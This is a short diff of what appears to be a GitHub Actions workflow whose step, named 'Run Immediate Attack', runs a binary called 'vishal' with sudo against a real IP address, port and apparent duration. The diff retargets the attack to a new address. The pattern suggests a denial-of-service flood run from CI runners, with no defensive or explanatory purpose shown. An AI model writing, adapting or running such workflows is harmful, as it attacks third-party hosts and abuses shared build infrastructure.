@@ -17,5 +17,5 @@ jobs:
           chmod +x vishal
       
       - name: Run Immediate Attack
-        run: sudo ./vishal 4.213.66.155 25804 300 
+        run: sudo ./vishal 20.41.255.119 27559 300 
         continue-on-error: true
